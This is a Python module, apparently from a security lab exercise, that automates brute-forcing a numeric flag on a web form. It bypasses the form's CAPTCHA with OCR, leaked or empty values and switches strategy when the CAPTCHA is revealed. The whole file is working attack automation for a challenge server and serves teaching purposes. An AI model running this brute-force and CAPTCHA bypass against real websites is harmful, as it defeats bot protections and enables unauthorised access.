import re
from typing import Type

import requests

from src.tp3.utils.captcha import Captcha, CaptchaOCR
from src.tp3.utils.config import logger


class Session:
    """
    Session HTTP générique pour résoudre un challenge CAPTCHA.

    Paramètres :
    - captcha_class     : stratégie de bypass (CaptchaOCR, CaptchaLeak, CaptchaEmpty…)
    - flag_min/flag_max : range de brute-force
    - extra_headers     : headers HTTP ajoutés à TOUTES les requêtes (ex: Magic-Word)
    - reveal_captcha_class : si défini, classe utilisée après révélation du captcha
                             (challenge 4 : d'abord CaptchaEmpty, puis CaptchaOCR)
    """

    def __init__(
        self,
        url: str,
        captcha_class: Type[Captcha],
        flag_min: int,
        flag_max: int,
        extra_headers: dict | None = None,
        reveal_captcha_class: Type[Captcha] | None = None,
    ):
        self.url = url
        self.captcha_value = ""
        self.flag_value = ""
        self.valid_flag = ""

        self._captcha_class = captcha_class
        self._flag_min = flag_min
        self._flag_max = flag_max
        self._current_flag = flag_min
        self._last_response: requests.Response | None = None
        self._captcha_revealed = False
        self._reveal_captcha_class = reveal_captcha_class

        self._http_session = requests.Session()
        if extra_headers:
            self._http_session.headers.update(extra_headers)

        self._http_session.get(self.url)

    def prepare_request(self) -> None:
        """
        Prépare la requête :
        - Si le captcha vient d'être révélé (challenge 4), bascule sur CaptchaOCR
        - Capture et résolution du CAPTCHA selon la stratégie courante
        - Sélectionne le prochain flag à tester
        """

        if self._current_flag > self._flag_max:
            raise RuntimeError(
                f"Brute-force exhausté : aucun flag trouvé entre "
                f"{self._flag_min} et {self._flag_max}"
            )

        if self._captcha_revealed and self._reveal_captcha_class is not None:
            active_class = self._reveal_captcha_class
        else:
            active_class = self._captcha_class

        captcha = active_class(self.url, self._http_session)
        captcha.capture()
        captcha.solve()

        self.captcha_value = captcha.get_value()
        self.flag_value = str(self._current_flag)
        self._current_flag += 1

        logger.debug(f"Tentative flag={self.flag_value} | captcha={self.captcha_value!r}")

    def submit_request(self) -> None:
        """
        Envoie la requête POST avec le flag et la valeur CAPTCHA.
        """

        data: dict = {"flag": self.flag_value, "submit": "Submit"}
        if self.captcha_value:
            data["captcha"] = self.captcha_value

        self._last_response = self._http_session.post(self.url, data=data)
        self._last_response.raise_for_status()

    def process_response(self) -> bool:
        """
        Analyse la réponse du serveur.

        Gère les cas :
        - Captcha invalide        → retry sans consommer le flag
        - Flag incorrect          → continuer le brute-force
        - Captcha révélé (ch. 4) → basculer en mode OCR, retenter même flag
        - Succès                  → True

        Returns:
            True si le flag est correct (challenge résolu).
            False si retry nécessaire.
        """

        if self._last_response is None:
            return False

        text = self._last_response.text

        if "Invalid captcha" in text or "where is the captcha" in text:
            logger.warning(
                f"Captcha invalide ('{self.captcha_value}'), nouvelle tentative..."
            )
            self._current_flag -= 1
            return False

        if (
            not self._captcha_revealed
            and self._reveal_captcha_class is not None
            and "captcha.php" in text
        ):
            logger.info("Captcha révélé ! Passage en mode OCR...")
            self._captcha_revealed = True
            self._current_flag -= 1
            return False

        if "Incorrect flag" in text or "alert-danger" in text:
            return False

        if "alert-success" in text or "<!-- Ok -->" in text or "alert-danger" not in text:
            match = re.search(r"alert-success[^>]*>([^<]+)<", text)
            if match:
                logger.info(f"Succès ! Message : {match.group(1).strip()}")
            self.valid_flag = self.flag_value
            logger.info(f"Flag trouvé : {self.valid_flag}")
            return True

        return False

    def get_flag(self) -> str:
        return self.valid_flag